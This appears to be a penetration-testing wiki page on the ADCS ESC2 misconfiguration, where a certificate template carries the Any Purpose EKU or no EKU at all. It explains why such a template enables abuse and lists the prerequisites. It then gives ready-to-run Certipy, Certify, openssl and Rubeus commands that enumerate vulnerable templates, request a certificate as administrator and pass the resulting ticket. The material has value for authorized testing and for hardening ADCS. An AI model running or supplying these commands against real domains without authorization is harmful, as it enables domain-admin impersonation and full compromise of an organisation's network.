# ESC2

{% hint style="info" %}
Certificate template has the **Any Purpose** EKU, or **no EKU at all** (potentially dangerous)
{% endhint %}

## Why It Works

* A template configured with the **Any Purpose** EKU (`OID 2.5.29.37.0`) can be used for literally anything a certificate supports - including Client Authentication (PKINIT) and even acting as a Certificate Request Agent (the same capability abused in ESC3).
* A template with **no EKU specified at all** is treated by Windows as a **Sub-CA-equivalent** certificate in some validation paths, which historically could also be abused for client authentication or as an enrollment agent, depending on CA/client behavior.
* If enrollment rights on such a template are available to a low-privileged principal, the attacker effectively has the same options as ESC1 (if `ENROLLEE_SUPPLIES_SUBJECT` is also set) or ESC3 (using the cert as an enrollment agent to request certs *on behalf of* another user).
* In short: ESC2 is rarely exploited standalone - it's a **force multiplier** that upgrades a template into an ESC1 or ESC3 vector.

## Prerequisites

* Enrollment rights on a template where EKU = Any Purpose or EKU list is empty.
* Either `ENROLLEE_SUPPLIES_SUBJECT` is also set (chain to ESC1), or the template can be used to request an enrollment-agent-style cert (chain to ESC3).

## Enumerate

{% tabs %}
{% tab title="Certipy" %}
```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Look for templates where "Extended Key Usage" = 'Any Purpose' or is empty, combined with low-priv 'Enrollment Rights'
```
{% endtab %}

{% tab title="Certify" %}
```bat
Certify.exe find /vulnerable
REM Review 'Enhanced Key Usage' in output for 'Any Purpose' or blank EKU list
```
{% endtab %}
{% endtabs %}

## Exploit

* If chained with ESC1 (SAN control available):

{% tabs %}
{% tab title="Certipy" %}
```bash
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <vulnerable-template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endtab %}

{% tab title="Certify + Rubeus" %}
```bat
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<vulnerable-template> /altname:administrator
openssl.exe pkcs12 -in esc2.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc2.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc2.pfx /ptt
```
{% endtab %}
{% endtabs %}

* If chained with ESC3 (no SAN control, but can act as enrollment agent), follow the ESC3 exploitation steps (both Linux and Windows workflows) using this template to obtain the agent certificate.
